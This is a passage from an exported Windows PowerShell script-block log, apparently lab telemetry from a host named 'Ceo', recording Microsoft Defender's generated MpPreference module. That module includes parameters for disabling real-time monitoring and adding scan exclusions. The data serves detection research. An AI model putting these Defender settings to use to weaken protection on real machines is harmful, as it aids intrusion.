    ${DisableCpuThrottleOnIdleScans},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${MAPSReporting},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SubmitSamplesConsent},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dae')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableAutoExclusions},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dpm')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisablePrivacyMode},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('rstt')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${RandomizeScheduleTaskTimes},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('srt')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SchedulerRandomizationTime},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dbm')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableBehaviorMonitoring},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dips')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableIntrusionPreventionSystem},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dioavp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableIOAVProtection},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('drtm')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableRealtimeMonitoring},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dscrptsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableScriptScanning},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('darchsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableArchiveScanning},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dcfsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableCatchupFullScan},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dcqsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableCatchupQuickScan},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('demsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableEmailScanning},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('drdsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableRemovableDriveScanning},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('drp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableRestorePoint},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dsmndfsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableScanningMappedNetworkDrivesForFullScan},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dsnf')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableScanningNetworkFiles},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${UILockdown},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('tiddefaci')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [long[]]
    ${ThreatIDDefaultAction_Ids},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('tiddefaca')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]]
    ${ThreatIDDefaultAction_Actions},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('unktdefac')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${UnknownThreatDefaultAction},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('ltdefac')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${LowThreatDefaultAction},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('mtdefac')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ModerateThreatDefaultAction},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('htdefac')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${HighThreatDefaultAction},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('stdefac')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SevereThreatDefaultAction},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dbaf')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableBlockAtFirstSeen},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${PUAProtection},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${CloudBlockLevel},

   

ScriptBlock ID: f825ae19-44cf-4ba7-981f-597df47e6edc
Path: ","f825ae19-44cf-4ba7-981f-597df47e6edc","arameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Add', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Add-MpPreference' -Alias '*'
        

function Remove-MpPreference
{
    [CmdletBinding(PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionPath},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionExtension},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionProcess},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionIpAddress},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('rtsd')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${RealTimeScanDirection},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('qpiad')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${QuarantinePurgeItemsAfterDelay},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('rsd')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${RemediationScheduleDay},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('rst')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${RemediationScheduleTime},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('raat')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ReportingAdditionalActionTimeOut},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('rcto')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ReportingCriticalFailureTimeOut},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('rncto')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ReportingNonCriticalTimeOut},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('shri')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ServiceHealthReportInterval},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('rdsde')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ReportDynamicSignatureDroppedEvent},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('saclf')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ScanAvgCPULoadFactor},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('csbr')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${CheckForSignaturesBeforeRunningScan},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('spiad')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ScanPurgeItemsAfterDelay},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('soiie')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ScanOnlyIfIdleEnabled},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ScanParameters},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('scsd')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ScanScheduleDay},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('scsqst')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ScanScheduleQuickScanTime},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('scst')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ScanScheduleTime},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('tfsso')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ThrottleForScheduledScanOnly},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('sigfagp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureFirstAuGracePeriod},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('sigagp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureAuGracePeriod},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('sigdufss')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureDefinitionUpdateFileSharesSources},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('sigduoswo')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureDisableUpdateOnStartupWithoutEngine},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('sfo')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureFallbackOrder},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('ssp','SecurityIntelligenceLocation','ssl')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SharedSignaturesPath},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('sigsd')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureScheduleDay},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('sigst')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureScheduleTime},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('siguci')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureUpdateCatchupInterval},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('sigui')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureUpdateInterval},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('sigbui')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureBlobUpdateInterval},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('sigbfs')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SignatureBlobFileSharesSources},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('mcupd')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${MeteredConnectionUpdates},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('anpws')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${AllowNetworkProtectionOnWinServer},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('ddtgp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableDatagramProcessing},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableCpuThrottleOnIdleScans},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${MAPSReporting},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SubmitSamplesConsent},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dae')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableAutoExclusions},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dpm')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisablePrivacyMode},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('rstt')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${RandomizeScheduleTaskTimes},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('srt')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SchedulerRandomizationTime},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dbm')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableBehaviorMonitoring},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dips')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableIntrusionPreventionSystem},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dioavp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableIOAVProtection},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('drtm')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableRealtimeMonitoring},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dscrptsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableScriptScanning},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('darchsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableArchiveScanning},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dcfsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableCatchupFullScan},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dcqsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableCatchupQuickScan},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('demsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableEmailScanning},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('drdsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableRemovableDriveScanning},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('drp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableRestorePoint},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dsmndfsc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableScanningMappedNetworkDrivesForFullScan},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dsnf')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableScanningNetworkFiles},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${UILockdown},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('tiddefaci')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [long[]]
    ${ThreatIDDefaultAction_Ids},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('tiddefaca')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]]
    ${ThreatIDDefaultAction_Actions},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('unktdefac')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${UnknownThreatDefaultAction},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('ltdefac')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${LowThreatDefaultAction},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('mtdefac')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ModerateThreatDefaultAction},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('htdefac')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${HighThreatDefaultAction},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('stdefac')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${SevereThreatDefaultAction},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dbaf')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableBlockAtFirstSeen},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${PUAProtection},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${CloudBlockLevel},

   ",11,20,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-fad2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3340,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.291",ankSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.648","Oct 23, 2022 @ 17:00:34.206",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (12 of 20):
 [Parameter(ParameterSetName='Remove2')]
    [Alias('cloudextimeout')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${CloudExtendedTimeout},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${EnableNetworkProtection},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${EnableControlledFolderAccess},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${AttackSurfaceReductionOnlyExclusions},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ControlledFolderAccessAllowedApplications},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ControlledFolderAccessProtectedFolders},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${AttackSurfaceReductionRules_Ids},

    [Parameter(ParameterSetName='Remove2')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]]
    ${AttackSurfaceReductionRules_Actions},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('elcp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${EnableLowCpuPriority},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('efhc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${EnableFileHashComputation},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('efsobp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${EnableFullScanOnBatteryPower},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('ppurl')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ProxyPacUrl},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('proxsrv')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ProxyServer},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('proxbps')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ProxyBypass},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('fupo')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ForceUseProxyOnly},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dtlsp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableTlsParsing},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dhttpp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableHttpParsing},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('ddnsp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableDnsParsing},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('ddnstcpp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableDnsOverTcpParsing},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dsshp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableSshParsing},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('puc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${PlatformUpdatesChannel},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('euc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${EngineUpdatesChannel},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('duc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DefinitionUpdatesChannel},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dgr')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableGradualRelease},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('anpdl')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${AllowNetworkProtectionDownLevel},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('adpows')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${AllowDatagramProcessingOnWinServer},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('ednss')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${EnableDnsSinkhole},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dicf')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableInboundConnectionFiltering},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('drdpp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableRdpParsing},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dnppt')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableNetworkProtectionPerfTelemetry},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('tlps')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${TrustLabelProtectionStatus},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('astai')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${AllowSwitchToAsyncInspection},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('scso')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${ScanScheduleOffset},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('dtdtf')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${DisableTDTFeature},

    [Parameter(ParameterSetName='Remove2')]
    [switch]
    ${Force},

    [Parameter(ParameterSetName='Remove2')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Remove2')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Remove2')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionPath')) {
          [object]$__cmdletization_value = ${ExclusionPath}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionExtension')) {
          [object]$__cmdletization_value = ${ExclusionExtension}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionProcess')) {
